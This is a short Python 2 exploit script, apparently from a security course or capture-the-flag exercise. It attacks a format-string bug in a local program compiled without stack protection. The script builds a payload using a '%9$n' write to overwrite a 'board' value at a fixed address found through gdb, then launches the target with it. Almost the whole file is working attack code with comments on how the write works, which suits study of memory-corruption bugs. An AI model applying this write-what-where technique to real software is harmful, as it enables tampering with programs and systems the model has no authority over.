#!/usr/bin/env python2

import subprocess
import sys
import os

def main(program):
    if not os.path.isfile(program):
        print("File '{}' does not exist".format(program))
        return

    u_size = 50 - 1 # excludes null byte at end

    # board_address retrieved by doing the following in gdb
    # - start "" ""
    # - info proc map (note the start and end address)
    # - find &board,+1024,"board1"
    #
    # - add a few characters to get the pos of "1"
    board_address = "\xb0\x99\04\x08" # "0x80499b0"
    board_num_address = "\xb5\x99\04\x08" # 0x80499b5

    prefix = "Hello! "
    word_align = "   " # word align the greeting prefix

    # %4x will pad four characters. so we can pad how much ever is the ordinal
    # value of "2" (but minus how much we've already written so far)
    offset = ord("2") - len(board_num_address) - len(prefix) - len(word_align)

    # %p prints out the pointer of the "first argument"
    # $9%p prints out the value of the 9th "argument" formatted as an addr.
    #       this corresponds to the position of the board_num_address below
    # %9$n writes $(count-of-characters-written-so-far) to the pointer at 9th arg
    user = word_align + board_num_address + "%" + str(offset) + "x%9$n"

    message = "pwned"

    # Note: CFLAGS=-fno-stack-protector -zexecstack -g -w
    # - (no-stack-protector) allows stack to be modified
    # - (execstack) allows stack to be executable
    # - (g) gdb
    # - (w) suppress warnings

    # print("Exploiting '{}':".format(program))
    # print("------------{}--".format(len(program) * '-'))
    subprocess.Popen(["env", "-i", program, user, message])

if __name__ == "__main__":
    main(sys.argv[1])